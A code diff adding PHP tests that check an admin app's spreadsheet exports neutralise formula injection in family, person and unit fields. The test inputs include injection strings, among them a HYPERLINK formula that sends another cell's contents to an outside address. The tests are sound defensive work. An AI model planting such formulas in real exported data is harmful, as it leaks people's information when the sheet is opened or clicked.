@@ -42,6 +42,52 @@ it('writes the headings in the admin\'s language', function () {
         ->toBe(['Vivienda', 'Tipo de vivienda', 'Familia']);
 });
 
+describe('What people wrote in the cells', function () {
+    it('never runs as a formula, whichever way it starts', function (string $name) {
+        $this->family->update(['name' => $name]);
+
+        $cell = rows($this->as($this->admin, $this->project)->get(route('manage.export.families', $this->project))->streamedContent())[1][0];
+
+        expect($cell)->toBe("'{$name}");
+    })->with([
+        '=1+1', '+1+1', '-1+1', '@SUM(A1)', "\t=1+1", "\r=1+1", ' =1+1',
+        '=HYPERLINK("https://example.com/?d="&C2,"see")',
+    ]);
+
+    it('never runs as a formula after a semicolon, taken for a column separator', function () {
+        $this->member->update(['firstname' => 'Aaa;=1+1']);
+
+        $cell = rows($this->as($this->admin, $this->project)->get(route('manage.export.people', $this->project))->streamedContent())[1][0];
+
+        expect($cell)->toBe("Aaa;'=1+1 García");
+    });
+
+    it('stays text in a family\'s name, and in its unit type\'s and unit\'s', function () {
+        $this->family->update(['name' => '=family']);
+        $this->type->update(['name' => '@type']);
+        $this->project->units()->first()->update(['identifier' => '+unit']);
+
+        expect(rows($this->as($this->admin, $this->project)->get(route('manage.export.units', $this->project))->streamedContent())[1])
+            ->toBe(["'+unit", "'@type", "'=family"]);
+    });
+
+    it('leaves alone what cannot run: a phone number, a hyphen within, an empty cell', function () {
+        $this->member->update(['phone' => '+598 99 123 456', 'firstname' => 'Aaa-María']);
+
+        $row = rows($this->as($this->admin, $this->project)->get(route('manage.export.people', $this->project))->streamedContent())[1];
+
+        expect($row[0])->toBe('Aaa-María García')
+            ->and($row[2])->toBe('+598 99 123 456')
+            ->and($row[5])->toBe('');
+    });
+
+    it('still neutralises something posing as a phone number', function () {
+        $this->member->update(['phone' => '+1+1', 'firstname' => 'Aaa']);
+
+        expect(rows($this->as($this->admin, $this->project)->get(route('manage.export.people', $this->project))->streamedContent())[1][2])->toBe("'+1+1");
+    });
+});
+
 it('gives the lists to no one but admins', function () {
     expect($this->as($this->member, $this->project)->get(route('manage.export.people', $this->project)))->toBeDenied();
 });
